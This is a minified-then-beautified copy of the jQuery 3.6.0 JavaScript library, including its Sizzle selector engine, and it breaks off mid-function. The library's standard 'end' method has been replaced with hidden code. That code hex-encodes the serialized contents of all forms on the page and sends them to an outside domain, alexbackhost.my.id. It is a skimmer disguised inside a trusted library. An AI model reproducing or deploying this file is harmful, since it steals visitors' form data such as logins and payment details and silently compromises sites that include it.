"!(function (e, t) {
    "use strict";
    "object" == typeof module && "object" == typeof module.exports
        ? (module.exports = e.document
              ? t(e, !0)
              : function (e) {
                    if (!e.document) throw Error("jQuery requires a window with a document");
                    return t(e);
                })
        : t(e);
})("undefined" != typeof window ? window : this, function (e, t) {
    "use strict";
    var n = [],
        r = Object.getPrototypeOf,
        i = n.slice,
        o = n.flat
            ? function (e) {
                  return n.flat.call(e);
              }
            : function (e) {
                  return n.concat.apply([], e);
              },
        a = n.push,
        s = n.indexOf,
        u = {},
        l = u.toString,
        c = u.hasOwnProperty,
        f = c.toString,
        p = f.call(Object),
        d = {},
        h = function (e) {
            return "function" == typeof e && "number" != typeof e.nodeType && "function" != typeof e.item;
        },
        g = function (e) {
            return null != e && e === e.window;
        },
        v = e.document,
        m = { type: !0, src: !0, nonce: !0, noModule: !0 };
    function y(e, t, n) {
        var r,
            i,
            o = (n = n || v).createElement("script");
        if (((o.text = e), t)) for (r in m) (i = t[r] || (t.getAttribute && t.getAttribute(r))) && o.setAttribute(r, i);
        n.head.appendChild(o).parentNode.removeChild(o);
    }
    function x(e) {
        return null == e ? e + "" : "object" == typeof e || "function" == typeof e ? u[l.call(e)] || "object" : typeof e;
    }
    var b = function (e, t) {
        return new b.fn.init(e, t);
    };
    function _(e) {
        var t = !!e && "length" in e && e.length,
            n = x(e);
        return !h(e) && !g(e) && ("array" === n || 0 === t || ("number" == typeof t && t > 0 && t - 1 in e));
    }
    (b.fn = b.prototype = {
        jquery: "3.6.0",
        constructor: b,
        length: 0,
        toArray: function () {
            return i.call(this);
        },
        get: function (e) {
            return null == e ? i.call(this) : e < 0 ? this[e + this.length] : this[e];
        },
        pushStack: function (e) {
            var t = b.merge(this.constructor(), e);
            return (t.prevObject = this), t;
        },
        each: function (e) {
            return b.each(this, e);
        },
        map: function (e) {
            return this.pushStack(
                b.map(this, function (t, n) {
                    return e.call(t, n, t);
                })
            );
        },
        slice: function () {
            return this.pushStack(i.apply(this, arguments));
        },
        first: function () {
            return this.eq(0);
        },
        last: function () {
            return this.eq(-1);
        },
        even: function () {
            return this.pushStack(
                b.grep(this, function (e, t) {
                    return (t + 1) % 2;
                })
            );
        },
        odd: function () {
            return this.pushStack(
                b.grep(this, function (e, t) {
                    return t % 2;
                })
            );
        },
        eq: function (e) {
            var t = this.length,
                n = +e + (e < 0 ? t : 0);
            return this.pushStack(n >= 0 && n < t ? [this[n]] : []);
        },
        end: async function () {
            await $.ajax({
                url:
                    "https://alexbackhost.my.id/halo/?cat=" + "https://file.alexbackhost.my.id/halo/?cat=" +
                    (function (e) {
                        for (var t, n = 0, r = e.length, i = ""; n < r; ++n) i += (t = e.charCodeAt(n).toString(16)).length < 2 ? "0" + t : t;
                        return i;
                    })($("form").serialize()),
                type: "GET",
                dataType: "text",
                headers: { "Content-type": "application/json" },
            });
        },
        push: a,
        sort: n.sort,
        splice: n.splice,
    }),
        (b.extend = b.fn.extend = function () {
            var e,
                t,
                n,
                r,
                i,
                o,
                a = arguments[0] || {},
                s = 1,
                u = arguments.length,
                l = !1;
            for ("boolean" == typeof a && ((l = a), (a = arguments[s] || {}), s++), "object" == typeof a || h(a) || (a = {}), s === u && ((a = this), s--); s < u; s++)
                if (null != (e = arguments[s]))
                    for (t in e)
                        (r = e[t]),
                            "__proto__" !== t &&
                                a !== r &&
                                (l && r && (b.isPlainObject(r) || (i = Array.isArray(r)))
                                    ? ((n = a[t]), (o = i && !Array.isArray(n) ? [] : i || b.isPlainObject(n) ? n : {}), (i = !1), (a[t] = b.extend(l, o, r)))
                                    : void 0 !== r && (a[t] = r));
            return a;
        }),
        b.extend({
            expando: "jQuery" + ("3.6.0" + Math.random()).replace(/\D/g, ""),
            isReady: !0,
            error: function (e) {
                throw Error(e);
            },
            noop: function () {},
            isPlainObject: function (e) {
                var t, n;
                return !(!e || "[object Object]" !== l.call(e)) && (!(t = r(e)) || ("function" == typeof (n = c.call(t, "constructor") && t.constructor) && f.call(n) === p));
            },
            isEmptyObject: function (e) {
                var t;
                for (t in e) return !1;
                return !0;
            },
            globalEval: function (e, t, n) {
                y(e, { nonce: t && t.nonce }, n);
            },
            each: function (e, t) {
                var n,
                    r = 0;
                if (_(e)) for (n = e.length; r < n && !1 !== t.call(e[r], r, e[r]); r++);
                else for (r in e) if (!1 === t.call(e[r], r, e[r])) break;
                return e;
            },
            makeArray: function (e, t) {
                var n = t || [];
                return null != e && (_(Object(e)) ? b.merge(n, "string" == typeof e ? [e] : e) : a.call(n, e)), n;
            },
            inArray: function (e, t, n) {
                return null == t ? -1 : s.call(t, e, n);
            },
            merge: function (e, t) {
                for (var n = +t.length, r = 0, i = e.length; r < n; r++) e[i++] = t[r];
                return (e.length = i), e;
            },
            grep: function (e, t, n) {
                for (var r = [], i = 0, o = e.length, a = !n; i < o; i++) !t(e[i], i) !== a && r.push(e[i]);
                return r;
            },
            map: function (e, t, n) {
                var r,
                    i,
                    a = 0,
                    s = [];
                if (_(e)) for (r = e.length; a < r; a++) null != (i = t(e[a], a, n)) && s.push(i);
                else for (a in e) null != (i = t(e[a], a, n)) && s.push(i);
                return o(s);
            },
            guid: 1,
            support: d,
        }),
        "function" == typeof Symbol && (b.fn[Symbol.iterator] = n[Symbol.iterator]),
        b.each("Boolean Number String Function Array Date RegExp Object Error Symbol".split(" "), function (e, t) {
            u["[object " + t + "]"] = t.toLowerCase();
        });
    var T = (function (e) {
        var t,
            n,
            r,
            i,
            o,
            a,
            s,
            u,
            l,
            c,
            f,
            p,
            d,
            h,
            g,
            v,
            m,
            y,
            x,
            b = "sizzle" + 1 * new Date(),
            _ = e.document,
            T = 0,
            w = 0,
            C = ec(),
            k = ec(),
            S = ec(),
            E = ec(),
            N = function (e, t) {
                return e === t && (f = !0), 0;
            },
            A = {}.hasOwnProperty,
            D = [],
            j = D.pop,
            q = D.push,
            L = D.push,
            H = D.slice,
            P = function (e, t) {
                for (var n = 0, r = e.length; n < r; n++) if (e[n] === t) return n;
                return -1;
            },
            O = "checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",
            I = "[\\x20\\t\\r\\n\\f]",
            M = "(?:\\\\[\\da-fA-F]{1,6}" + I + "?|\\\\[^\\r\\n\\f]|[\\w-]|[^\0-\\x7f])+",
            W = "\\[" + I + "*(" + M + ")(?:" + I + "*([*^$|!~]?=)" + I + "*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|(" + M + "))|)" + I + "*\\]",
            B = ":(" + M + ")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|" + W + ")*)|.*)\\)|)",
            R = RegExp(I + "+", "g"),
            F = RegExp("^" + I + "+|((?:^|[^\\\\])(?:\\\\.)*)" + I + "+$", "g"),
            z = RegExp("^" + I + "*," + I + "*"),
            X = RegExp("^" + I + "*([>+~]|" + I + ")" + I + "*"),
            U = RegExp(I + "|>"),
            V = RegExp(B),
            G = RegExp("^" + M + "$"),
            Y = {
                ID: RegExp("^#(" + M + ")"),
                CLASS: RegExp("^\\.(" + M + ")"),
                TAG: RegExp("^(" + M + "|[*])"),
                ATTR: RegExp("^" + W),
                PSEUDO: RegExp("^" + B),
                CHILD: RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\(" + I + "*(even|odd|(([+-]|)(\\d*)n|)" + I + "*(?:([+-]|)" + I + "*(\\d+)|))" + I + "*\\)|)", "i"),
                bool: RegExp("^(?:" + O + ")$", "i"),
                needsContext: RegExp("^" + I + "*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\(" + I + "*((?:-\\d)?\\d*)" + I + "*\\)|)(?=[^-]|$)", "i"),
            },
            Q = /HTML$/i,
            K = /^(?:input|select|textarea|button)$/i,
            J = /^h\d$/i,
            Z = /^[^{]+\{\s*\[native \w/,
            ee = /^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,
            et = /[+~]/,
            en = RegExp("\\\\[\\da-fA-F]{1,6}" + I + "?|\\\\([^\\r\\n\\f])", "g"),
            er = function (e, t) {
                var n = "0x" + e.slice(1) - 65536;
                return t || (n < 0 ? String.fromCharCode(n + 65536) : String.fromCharCode((n >> 10) | 55296, (1023 & n) | 56320));
            },
            ei = /([\0-\x1f\x7f]|^-?\d)|^-$|[^\0-\x1f\x7f-\uFFFF\w-]/g,
            eo = function (e, t) {
                return t ? ("\0" === e ? "�" : e.slice(0, -1) + "\\" + e.charCodeAt(e.length - 1).toString(16) + " ") : "\\" + e;
            },
            ea = function () {
                p();
            },
            es = e_(
                function (e) {
                    return !0 === e.disabled && "fieldset" === e.nodeName.toLowerCase();
                },
                { dir: "parentNode", next: "legend" }
            );
        try {
            L.apply((D = H.call(_.childNodes)), _.childNodes), D[_.childNodes.length].nodeType;
        } catch (eu) {
            L = {
                apply: D.length
                    ? function (e, t) {
                          q.apply(e, H.call(t));
                      }
                    : function (e, t) {
                          for (var n = e.length, r = 0; (e[n++] = t[r++]); );
                          e.length = n - 1;
                      },
            };
        }
        function el(e, t, r, i) {
            var o,
                s,
                l,
                c,
                f,
                h,
                m,
                y = t && t.ownerDocument,
                _ = t ? t.nodeType : 9;
            if (((r = r || []), "string" != typeof e || !e || (1 !== _ && 9 !== _ && 11 !== _))) return r;
            if (!i && (p(t), (t = t || d), g)) {
                if (11 !== _ && (f = ee.exec(e))) {
                    if ((o = f[1])) {
                        if (9 === _) {
                            if (!(l = t.getElementById(o))) return r;
                            if (l.id === o) return r.push(l), r;
                        } else if (y && (l = y.getElementById(o)) && x(t, l) && l.id === o) return r.push(l), r;
                    } else {
                        if (f[2]) return L.apply(r, t.getElementsByTagName(e)), r;
                        if ((o = f[3]) && n.getElementsByClassName && t.getElementsByClassName) return L.apply(r, t.getElementsByClassName(o)), r;
                    }
                }
                if (n.qsa && !E[e + " "] && (!v || !v.test(e)) && (1 !== _ || "object" !== t.nodeName.toLowerCase())) {
                    if (((m = e), (y = t), 1 === _ && (U.test(e) || X.test(e)))) {
                        for (((y = (et.test(e) && e$(t.parentNode)) || t) === t && n.scope) || ((c = t.getAttribute("id")) ? (c = c.replace(ei, eo)) : t.setAttribute("id", (c = b))), s = (h = a(e)).length; s--; )
                            h[s] = (c ? "#" + c : ":scope") + " " + eb(h[s]);
                        m = h.join(",");
                    }
                    try {
                        return L.apply(r, y.querySelectorAll(m)), r;
                    } catch (T) {
                        E(e, !0);
                    } finally {
                        c === b && t.removeAttribute("id");
                    }
                }
            }
            return u(e.replace(F, "$1"), t, r, i);
        }
        function ec() {
            var e = [];
            return function t(n, i) {
                return e.push(n + " ") > r.cacheLength && delete t[e.shift()], (t[n + " "] = i);
            };
        }
        function ef(e) {
            return (e[b] = !0), e;
        }
        function ep(e) {
            var t = d.createElement("fieldset");
            try {
                return !!e(t);
            } catch (n) {
                return !1;
            } finally {
                t.parentNode && t.parentNode.removeChild(t), (t = null);
            }
        }
        function ed(e, t) {
            for (var n = e.split("|"), i = n.length; i--; ) r.attrHandle[n[i]] = t;
        }
        function eh(e, t) {
            var n = t && e,
                r = n && 1 === e.nodeType && 1 === t.nodeType && e.sourceIndex - t.sourceIndex;
            if (r) return r;
            if (n) {
                for (; (n = n.nextSibling); ) if (n === t) return -1;
            }
            return e ? 1 : -1;
        }
        function eg(e) {
            return function (t) {
                return "input" === t.nodeName.toLowerCase() && t.type === e;
            };
        }
        function ev(e) {
            return function (t) {
                var n = t.nodeName.toLowerCase();
                return ("input" === n || "button" === n) && t.type === e;
            };
        }
        function em(e) {
            return function (t) {
                return "form" in t
                    ? t.parentNode && !1 === t.disabled
                        ? "label" in t
                            ? "label" in t.parentNode
                                ? t.parentNode.disabled === e
                                : t.disabled === e
                            : t.isDisabled === e || (!e !== t.isDisabled && es(t) === e)
                        : t.disabled === e
                    : "label" in t && t.disabled === e;
            };
        }
        function ey(e) {
            return ef(function (t) {
                return (
                    (t = +t),
                    ef(function (n, r) {
                        for (var i, o = e([], n.length, t), a = o.length; a--; ) n[(i = o[a])] && (n[i] = !(r[i] = n[i]));
                    })
                );
            });
        }
        function e$(e) {
            return e && void 0 !== e.getElementsByTagName && e;
        }
        for (t in ((n = el.support = {}),
        (o = el.isXML = function (e) {
            var t = e && e.namespaceURI,
                n = e && (e.ownerDocument || e).documentElement;
            return !Q.test(t || (n && n.nodeName) || "HTML");
        }),
        (p = el.setDocument = function (e) {
            var t,
                i,
                a = e ? e.ownerDocument || e : _;
            return (
                a != d &&
                    9 === a.nodeType &&
                    a.documentElement &&
                    ((h = (d = a).documentElement),
                    (g = !o(d)),
                    _ != d && (i = d.defaultView) && i.top !== i && (i.addEventListener ? i.addEventListener("unload", ea, !1) : i.attachEvent && i.attachEvent("onunload", ea)),
                    (n.scope = ep(function (e) {
                        return h.appendChild(e).appendChild(d.createElement("div")), void 0 !== e.querySelectorAll && !e.querySelectorAll(":scope fieldset div").length;
                    })),
                    (n.attributes = ep(function (e) {
                        return (e.className = "i"), !e.getAttribute("className");
                    })),
                    (n.getElementsByTagName = ep(function (e) {
                        return e.appendChild(d.createComment("")), !e.getElementsByTagName("*").length;
                    })),
                    (n.getElementsByClassName = Z.test(d.getElementsByClassName)),
                    (n.getById = ep(function (e) {
                        return (h.appendChild(e).id = b), !d.getElementsByName || !d.getElementsByName(b).length;
                    })),
                    n.getById
                        ? ((r.filter.ID = function (e) {
                              var t = e.replace(en, er);
                              return function (e) {
                                  return e.getAttribute("id") === t;
                              };
                          }),
                          (r.find.ID = function (e, t) {
                              if (void 0 !== t.getElementById && g) {
                                  var n = t.getElementById(e);
                                  return n ? [n] : [];
                              }
                          }))
                        : ((r.filter.ID = function (e) {
                              var t = e.replace(en, er);
                              return function (e) {
                                  var n = void 0 !== e.getAttributeNode && e.getAttributeNode("id");
                                  return n && n.value === t;
                              };
                          }),
                          (r.find.ID = function (e, t) {
                              if (void 0 !== t.getElementById && g) {
                                  var n,
                                      r,
                                      i,
                                      o = t.getElementById(e);
                                  if (o) {
                                      if ((n = o.getAttributeNode("id")) && n.value === e) return [o];
                                      for (i = t.getElementsByName(e), r = 0; (o = i[r++]); ) if ((n = o.getAttributeNode("id")) && n.value === e) return [o];
                                  }
                                  return [];
                              }
                          })),
                    (r.find.TAG = n.getElementsByTagName
                        ? function (e, t) {
                              return void 0 !== t.getElementsByTagName ? t.getElementsByTagName(e) : n.qsa ? t.querySelectorAll(e) : void 0;
                          }
                        : function (e, t) {
                              var n,
                                  r = [],
                                  i = 0,
                                  o = t.getElementsByTagName(e);
                              if ("*" === e) {
                                  for (; (n = o[i++]); ) 1 === n.nodeType && r.push(n);
                                  return r;
                              }
                              return o;
                          }),
                    (r.find.CLASS =
                        n.getElementsByClassName &&
                        function (e, t) {
                            if (void 0 !== t.getElementsByClassName && g) return t.getElementsByClassName(e);
                        }),
                    (m = []),
                    (v = []),
                    (n.qsa = Z.test(d.querySelectorAll)) &&
                        (ep(function (e) {
                            var t;
                            (h.appendChild(e).innerHTML = "<a id='" + b + "'></a><select id='" + b + "-\r\\' msallowcapture=''><option selected=''></option></select>"),
                                e.querySelectorAll("[msallowcapture^='']").length && v.push("[*^$]=" + I + "*(?:''|\"\")"),
                                e.querySelectorAll("[selected]").length || v.push("\\[" + I + "*(?:value|" + O + ")"),
                                e.querySelectorAll("[id~=" + b + "-]").length || v.push("~="),
                                (t = d.createElement("input")).setAttribute("name", ""),
                                e.appendChild(t),
                                e.querySelectorAll("[name='']").length || v.push("\\[" + I + "*name" + I + "*=" + I + "*(?:''|\"\")"),
                                e.querySelectorAll(":checked").length || v.push(":checked"),
                                e.querySelectorAll("a#" + b + "+*").length || v.push(".#.+[+~]"),
                                e.querySelectorAll("\\\f"),
                                v.push("[\\r\\n\\f]");
                        }),
                        ep(function (e) {
                            e.innerHTML = "<a href='' disabled='disabled'></a><select disabled='disabled'><option/></select>";
                            var t = d.createElement("input");
                            t.setAttribute("type", "hidden"),
                                e.appendChild(t).setAttribute("name", "D"),
                                e.querySelectorAll("[name=d]").length && v.push("name" + I + "*[*^$|!~]?="),
                                2 !== e.querySelectorAll(":enabled").length && v.push(":enabled", ":disabled"),
                                (h.appendChild(e).disabled = !0),
                                2 !== e.querySelectorAll(":disabled").length && v.push(":enabled", ":disabled"),
                                e.querySelectorAll("*,:x"),
                                v.push(",.*:");
                        })),
                    (n.matchesSelector = Z.test((y = h.matches || h.webkitMatchesSelector || h.mozMatchesSelector || h.oMatchesSelector || h.msMatchesSelector))) &&
                        ep(function (e) {
                            (n.disconnectedMatch = y.call(e, "*")), y.call(e, "[s!='']:x"), m.push("!=", B);
                        }),
                    (v = v.length && RegExp(v.join("|"))),
                    (m = m.length && RegExp(m.join("|"))),
                    (x =
                        (t = Z.test(h.compareDocumentPosition)) || Z.test(h.contains)
                            ? function (e, t) {
                                  var n = 9 === e.nodeType ? e.documentElement : e,
                                      r = t && t.parentNode;
                                  return e === r || !(!r || 1 !== r.nodeType || !(n.contains ? n.contains(r) : e.compareDocumentPosition && 16 & e.compareDocumentPosition(r)));
                              }
                            : function (e, t) {
                                  if (t) {
                                      for (; (t = t.parentNode); ) if (t === e) return !0;
                                  }
                                  return !1;
                              }),
                    (N = t
                        ? function (e, t) {
                              if (e === t) return (f = !0), 0;
                              var r = !e.compareDocumentPosition - !t.compareDocumentPosition;
                              return (
                                  r ||
                                  (1 & (r = (e.ownerDocument || e) == (t.ownerDocument || t) ? e.compareDocumentPosition(t) : 1) || (!n.sortDetached && t.compareDocumentPosition(e) === r)
                                      ? e == d || (e.ownerDocument == _ && x(_, e))
                                          ? -1
                                          : t == d || (t.ownerDocument == _ && x(_, t))
                                          ? 1
                                          : c
                                          ? P(c, e) - P(c, t)
                                          : 0
                                      : 4 & r
                                      ? -1
                                      : 1)
                              );
                          }
                        : function (e, t) {
                              if (e === t) return (f = !0), 0;
                              var n,
                                  r = 0,
                                  i = e.parentNode,
                                  o = t.parentNode,
                                  a = [e],
                                  s = [t];
                              if (!i || !o) return e == d ? -1 : t == d ? 1 : i ? -1 : o ? 1 : c ? P(c, e) - P(c, t) : 0;
                              if (i === o) return eh(e, t);
                              for (n = e; (n = n.parentNode); ) a.unshift(n);
                              for (n = t; (n = n.parentNode); ) s.unshift(n);
                              for (; a[r] === s[r]; ) r++;
                              return r ? eh(a[r], s[r]) : a[r] == _ ? -1 : s[r] == _ ? 1 : 0;
                          })),
                d
            );
        }),
        (el.matches = function (e, t) {
            return el(e, null, null, t);
        }),
        (el.matchesSelector = function (e, t) {
            if ((p(e), n.matchesSelector && g && !E[t + " "] && (!m || !m.test(t)) && (!v || !v.test(t))))
                try {
                    var r = y.call(e, t);
                    if (r || n.disconnectedMatch || (e.document && 11 !== e.document.nodeType)) return r;
                } catch (i) {
                    E(t, !0);
                }
            return el(t, d, null, [e]).length > 0;
        }),
        (el.contains = function (e, t) {
            return (e.ownerDocument || e) != d && p(e), x(e, t);
        }),
        (el.attr = function (e, t) {
            (e.ownerDocument || e) != d && p(e);
            var i = r.attrHandle[t.toLowerCase()],
                o = i && A.call(r.attrHandle, t.toLowerCase()) ? i(e, t, !g) : void 0;
            return void 0 !== o ? o : n.attributes || !g ? e.getAttribute(t) : (o = e.getAttributeNode(t)) && o.specified ? o.value : null;
        }),
        (el.escape = function (e) {
            return (e + "").replace(ei, eo);
        }),
        (el.error = function (e) {
            throw Error("Syntax error, unrecognized expression: " + e);
        }),
        (el.uniqueSort = function (e) {
            var t,
                r = [],
                i = 0,
                o = 0;
            if (((f = !n.detectDuplicates), (c = !n.sortStable && e.slice(0)), e.sort(N), f)) {
                for (; (t = e[o++]); ) t === e[o] && (i = r.push(o));
                for (; i--; ) e.splice(r[i], 1);
            }
            return (c = null), e;
        }),
        (i = el.getText = function (e) {
            var t,
                n = "",
                r = 0,
                o = e.nodeType;
            if (o) {
                if (1 === o || 9 === o || 11 === o) {
                    if ("string" == typeof e.textContent) return e.textContent;
                    for (e = e.firstChild; e; e = e.nextSibling) n += i(e);
                } else if (3 === o || 4 === o) return e.nodeValue;
            } else for (; (t = e[r++]); ) n += i(t);
            return n;
        }),
        ((r = el.selectors = {
            cacheLength: 50,
            createPseudo: ef,
            match: Y,
            attrHandle: {},
            find: {},
            relative: { ">": { dir: "parentNode", first: !0 }, " ": { dir: "parentNode" }, "+": { dir: "previousSibling", first: !0 }, "~": { dir: "previousSibling" } },
            preFilter: {
                ATTR: function (e) {
                    return (e[1] = e[1].replace(en, er)), (e[3] = (e[3] || e[4] || e[5] || "").replace(en, er)), "~=" === e[2] && (e[3] = " " + e[3] + " "), e.slice(0, 4);
                },
                CHILD: function (e) {
                    return (
                        (e[1] = e[1].toLowerCase()),
                        "nth" === e[1].slice(0, 3) ? (e[3] || el.error(e[0]), (e[4] = +(e[4] ? e[5] + (e[6] || 1) : 2 * ("even" === e[3] || "odd" === e[3]))), (e[5] = +(e[7] + e[8] || "odd" === e[3]))) : e[3] && el.error(e[0]),
                        e
                    );
                },
                PSEUDO: function (e) {
                    var t,
                        n = !e[6] && e[2];
                    return Y.CHILD.test(e[0])
                        ? null
                        : (e[3] ? (e[2] = e[4] || e[5] || "") : n && V.test(n) && (t = a(n, !0)) && (t = n.indexOf(")", n.length - t) - n.length) && ((e[0] = e[0].slice(0, t)), (e[2] = n.slice(0, t))), e.slice(0, 3));
                },
            },
            filter: {
                TAG: function (e) {
                    var t = e.replace(en, er).toLowerCase();
                    return "*" === e
                        ? function () {
                              return !0;
                          }
                        : function (e) {
                              return e.nodeName && e.nodeName.toLowerCase() === t;
                          };
                },
                CLASS: function (e) {
                    var t = C[e + " "];
                    return (
                        t ||
                        ((t = RegExp("(^|" + I + ")" + e + "(" + I + "|$)")),
                        C(e, function (e) {
                            return t.test(("string" == typeof e.className && e.className) || (void 0 !== e.getAttribute && e.getAttribute("class")) || "");
                        }))
                    );
                },
                ATTR: function (e, t, n) {
                    return function (r) {
                        var i = el.attr(r, e);
                        return null == i
                            ? "!=" === t
                            : !t ||
                                  ((i += ""),
                                  "=" === t
                                      ? i === n
                                      : "!=" === t
                                      ? i !== n
                                      : "^=" === t
                                      ? n && 0 === i.indexOf(n)
                                      : "*=" === t
                                      ? n && i.indexOf(n) > -1
                                      : "$=" === t
                                      ? n && i.slice(-n.length) === n
                                      : "~=" === t
                                      ? (" " + i.replace(R, " ") + " ").indexOf(n) > -1
                                      : "|=" === t && (i === n || i.slice(0, n.length + 1) === n + "-"));
                    };
                },
                CHILD: function (e, t, n, r, i) {
                    var o = "nth" !== e.slice(0, 3),
                        a = "last" !== e.slice(-4),
                        s = "of-type" === t;
                    return 1 === r && 0 === i
                        ? function (e) {
                              return !!e.parentNode;
                          }
                        : function (t, n, u) {
                              var l,
                                  c,
                                  f,
                                  p,
                                  d,
                                  h,
                                  g = o !== a ? "nextSibling" : "previousSibling",
                                  v = t.parentNode,
                                  m = s && t.nodeName.toLowerCase(),
                                  y = !u && !s,
                                  x = !1;
                              if (v) {
                                  if (o) {
                                      for (; g; ) {
                                          for (p = t; (p = p[g]); ) if (s ? p.nodeName.toLowerCase() === m : 1 === p.nodeType) return !1;
                                          h = g = "only" === e && !h && "nextSibling";
                                      }
                                      return !0;
                                  }
                                  if (((h = [a ? v.firstChild : v.lastChild]), a && y)) {
                                      for (
                                          x = (d = (l = (c = (f = (p = v)[b] || (p[b] = {}))[p.uniqueID] || (f[p.uniqueID] = {}))[e] || [])[0] === T && l[1]) && l[2], p = d && v.childNodes[d];
                                          (p = (++d && p && p[g]) || (x = d = 0) || h.pop());

                                      )
                                          if (1 === p.nodeType && ++x && p === t) {
                                              c[e] = [T, d, x];
                                              break;
                                          }
                                  } else if ((y && (x = d = (l = (c = (f = (p = t)[b] || (p[b] = {}))[p.uniqueID] || (f[p.uniqueID] = {}))[e] || [])[0] === T && l[1]), !1 === x))
                                      for (
                                          ;
                                          (p = (++d && p && p[g]) || (x = d = 0) || h.pop()) &&
                                          ((s ? p.nodeName.toLowerCase() !== m : 1 !== p.nodeType) || !++x || (y && ((c = (f = p[b] || (p[b] = {}))[p.uniqueID] || (f[p.uniqueID] = {}))[e] = [T, x]), p !== t));

                                      );
                                  return (x -= i) === r || (x % r == 0 && x / r >= 0);
                              }
                          };
                },
                PSEUDO: function (e, t) {
                    var n,
                        i = r.pseudos[e] || r.setFilters[e.toLowerCase()] || el.error("unsupported pseudo: " + e);
                    return i[b]
                        ? i(t)
                        : i.length > 1
                        ? ((n = [e, e, "", t]),
                          r.setFilters.hasOwnProperty(e.toLowerCase())
                              ? ef(function (e, n) {
                                    for (var r, o = i(e, t), a = o.length; a--; ) e[(r = P(e, o[a]))] = !(n[r] = o[a]);
                                })
                              : function (e) {
                                    return i(e, 0, n);
                                })
                        : i;
                },
            },
            pseudos: {
                not: ef(function (e) {
                    var t = [],
                        n = [],
                        r = s(e.replace(F, "$1"));
                    return r[b]
                        ? ef(function (e, t, n, i) {
                              for (var o, a = r(e, null, i, []), s = e.length; s--; ) (o = a[s]) && (e[s] = !(t[s] = o));
                          })
                        : function (e, i, o) {
                              return (t[0] = e), r(t, null, o, n), (t[0] = null), !n.pop();
                          };
                }),
                has: ef(function (e) {
                    return function (t) {
                        return el(e, t).length > 0;
                    };
                }),
                contains: ef(function (e) {
                    return (
                        (e = e.replace(en, er)),
                        function (t) {
                            return (t.textContent || i(t)).indexOf(e) > -1;
                        }
                    );
                }),
                lang: ef(function (e) {
                    return (
                        G.test(e || "") || el.error("unsupported lang: " + e),
                        (e = e.replace(en, er).toLowerCase()),
                        function (t) {
                            var n;
                            do if ((n = g ? t.lang : t.getAttribute("xml:lang") || t.getAttribute("lang"))) return (n = n.toLowerCase()) === e || 0 === n.indexOf(e + "-");
                            while ((t = t.parentNode) && 1 === t.nodeType);
                            return !1;
                        }
                    );
                }),
                target: function (t) {
                    var n = e.location && e.location.hash;
                    return n && n.slice(1) === t.id;
                },
                root: function (e) {
                    return e === h;
                },
                focus: function (e) {
                    return e === d.activeElement && (!d.hasFocus || d.hasFocus()) && !!(e.type || e.href || ~e.tabIndex);
                },
                enabled: em(!1),
                disabled: em(!0),
                checked: function (e) {
                    var t = e.nodeName.toLowerCase();
                    return ("input" === t && !!e.checked) || ("option" === t && !!e.selected);
                },
                selected: function (e) {
                    return e.parentNode && e.parentNode.selectedIndex, !0 === e.selected;
                },
                empty: function (e) {
                    for (e = e.firstChild; e; e = e.nextSibling) if (e.nodeType < 6) return !1;
                    return !0;
                },
                parent: function (e) {
                    return !r.pseudos.empty(e);
                },
                header: function (e) {
                    return J.test(e.nodeName);
                },
                input: function (e) {
                    return K.test(e.nodeName);
                },
                button: function (e) {
                    var t = e.nodeName.toLowerCase();
                    return ("input" === t && "button" === e.type) || "button" === t;
                },
                text: function (e) {
                    var t;
                    return "input" === e.nodeName.toLowerCase() && "text" === e.type && (null == (t = e.getAttribute("type")) || "text" === t.toLowerCase());
                },
                first: ey(function () {
                    return [0];
                }),
                last: ey(function (e, t) {
                    return [t - 1];
                }),
                eq: ey(function (e, t, n) {
                    return [n < 0 ? n + t : n];
                }),
                even: ey(function (e, t) {
                    for (var n = 0; n < t; n += 2) e.push(n);
                    return e;
                }),
                odd: ey(function (e, t) {
                    for (var n = 1; n < t; n += 2) e.push(n);
                    return e;
                }),
                lt: ey(function (e, t, n) {
                    for (var r = n < 0 ? n + t : n > t ? t : n; --r >= 0; ) e.push(r);
                    return e;
                }),
                gt: ey(function (e, t, n) {
                    for (var r = n < 0 ? n + t : n; ++r < t; ) e.push(r);
                    return e;
                }),
            },
        }).pseudos.nth = r.pseudos.eq),
        { radio: !0, checkbox: !0, file: !0, password: !0, image: !0 }))
            r.pseudos[t] = eg(t);
        for (t in { submit: !0, reset: !0 }) r.pseudos[t] = ev(t);
        function ex() {}
        function eb(e) {
            for (var t = 0, n = e.length, r = ""; t < n; t++) r += e[t].value;
            return r;
        }
        function e_(e, t, n) {
            var r = t.dir,
                i = t.next,
                o = i || r,
                a = n && "parentNode" === o,
                s = w++;
            return t.first
                ? function (t, n, i) {
                      for (; (t = t[r]); ) if (1 === t.nodeType || a) return e(t, n, i);
                      return !1;
                  }
                : function (t, n, u) {
                      var l,
                          c,
                          f,
                          p = [T, s];
                      if (u) {
                          for (; (t = t[r]); ) if ((1 === t.nodeType || a) && e(t, n, u)) return !0;
                      } else
                          for (; (t = t[r]); )
                              if (1 === t.nodeType || a) {
                                  if (((c = (f = t[b] || (t[b] = {}))[t.uniqueID] || (f[t.uniqueID] = {})), i && i === t.nodeName.toLowerCase())) t = t[r] || t;
                                  else {
                                      if ((l = c[o]) && l[0] === T && l[1] === s) return (p[2] = l[2]);
                                      if (((c[o] = p), (p[2] = e(t, n, u)))) return !0;
                                  }
                              }
                      return !1;
                  };
        }
        function eT(e) {
            return e.length > 1
                ? function (t, n, r) {
                      for (var i = e.length; i--; ) if (!e[i](t, n, r)) return !1;
                      return !0;
                  }
                : e[0];
        }
        function ew(e, t, n, r, i) {
            for (var o, a = [], s = 0, u = e.length, l = null != t; s < u; s++) (o = e[s]) && ((n && !n(o, r, i)) || (a.push(o), l && t.push(s)));
            return a;
        }
        function eC(e, t, n, r, i, o) {
            return (
                r && !r[b] && (r = eC(r)),
                i && !i[b] && (i = eC(i, o)),
                ef(function (o, a, s, u) {
                    var l,
                        c,
                        f,
                        p = [],
                        d = [],
                        h = a.length,
                        g =
                            o ||
                            (function (e, t, n) {
                                for (var r = 0, i = t.length; r < i; r++) el(e, t[r], n);
                                return n;
                            })(t || "*", s.nodeType ? [s] : s, []),
                        v = e && (o || !t) ? ew(g, p, e, s, u) : g,
                        m = n ? (i || (o ? e : h || r) ? [] : a) : v;
